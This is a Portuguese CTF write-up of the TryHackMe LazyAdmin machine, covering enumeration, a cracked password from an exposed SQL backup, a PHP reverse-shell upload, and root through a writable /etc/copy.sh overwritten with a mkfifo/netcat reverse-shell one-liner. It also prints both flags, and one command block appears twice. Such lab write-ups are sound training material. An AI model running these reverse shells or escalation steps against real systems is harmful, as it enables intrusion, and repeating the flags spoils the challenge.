@@ -1,0 +1,126 @@
+🐧 TryHackMe - LazyAdmin Writeup
+📌 Informações Gerais
+
+Plataforma: TryHackMe
+
+Máquina: LazyAdmin
+
+Dificuldade: Easy
+
+Objetivo: Capturar as flags user.txt e root.txt
+
+🔎 Enumeração
+O primeiro passo em qualquer CTF é realizar uma enumeração de portas e serviços com Nmap. Usei a flag -sC (scripts padrão), -sV (detecção de versão) e -Pn (ignorar ping).
+
+    nmap -Pn -sC -sV -oN ./lazyadmin.nmap 10.10.110.22
+
+O resultado mostrou:
+
+    22/tcp → SSH (OpenSSH 7.2p2 Ubuntu)
+
+    80/tcp → HTTP (Apache 2.4.18)
+
+Isso indica que temos um servidor web ativo e possivelmente credenciais de SSH podem ser úteis depois.
+
+📂 Enumerando diretórios
+
+Com Gobuster, descobri diretórios escondidos no servidor web:
+
+    gobuster dir -u http://10.10.110.22/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+O scan revelou a pasta /content/.
+
+⚙️ Exploração
+
+Dentro de /content/inc/mysql_backup/, encontrei um arquivo de backup SQL exposto:
+
+    wget http://10.10.110.22/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
+
+Ao analisar o arquivo, encontrei um hash de senha:
+
+    "passwd\";s:32:\"42f749ade7f9e195bf475f37a44cafcb\
+
+Pesquisei o hash em Crackstation e obtive:
+
+    Senha: Password123
+
+Com isso, as credenciais descobertas foram:
+
+    Usuário: manager
+
+    Senha: Password123
+
+Acessei o painel em http://10.10.110.22/content/as/ com sucesso.
+
+🐚 Ganhando acesso (Reverse Shell)
+
+Para obter uma shell interativa, upei o famoso PHP Reverse Shell do Pentestmonkey:
+
+    wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+
+Configurei o IP e a porta no script, iniciei um listener com Netcat:
+
+    nc -lvnp 4444
+
+E ao acessar o arquivo pelo navegador, recebi a shell.
+
+Para melhorar a usabilidade, converti a shell em uma PTY interativa:
+
+    python -c 'import pty; pty.spawn("/bin/bash")'
+
+🔑 Escalada de Privilégios
+Primeiro, coletei a flag do usuário:
+
+    cd /home/itguy
+    cat user.txt
+    THM{63e5bce9271952aad1113b6f1ac28a07}
+
+Depois verifiquei permissões de sudo e encontrei um script interessante:
+
+    sudo -l
+    cat /home/itguy/backup.pl
+    cat /etc/copy.sh
+
+Depois verifiquei permissões de sudo e encontrei um script interessante:
+
+    sudo -l
+    cat /home/itguy/backup.pl
+    cat /etc/copy.sh
+
+O script chamava /etc/copy.sh, que podia ser editado. Isso permitia injetar comandos.
+
+Injetei um novo reverse shell em copy.sh:
+
+    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc (ip) > /tmp/f" > /etc/copy.sh
+
+Iniciei o listener:
+
+    nc -lvnp 5554
+
+E então executei o script com privilégios de root:
+
+    sudo /usr/bin/perl /home/itguy/backup.pl
+
+🏆 Root Flag
+Na nova shell com privilégios de root:
+
+    cd /root
+    cat root.txt
+    THM{6637f41d0177b6f37cb20d775124699f}
+
+✅ Conclusão
+
+O CTF LazyAdmin mostrou vários pontos de falha comuns em ambientes reais:
+
+Arquivos de backup expostos contendo credenciais sensíveis.
+
+Senhas fracas e facilmente crackeadas.
+
+Reutilização de credenciais em painéis administrativos.
+
+Escalada de privilégios via scripts inseguros.
+
+Foi um excelente exercício para praticar enumeração, exploração web, movimento lateral e privilege escalation
+
+
+
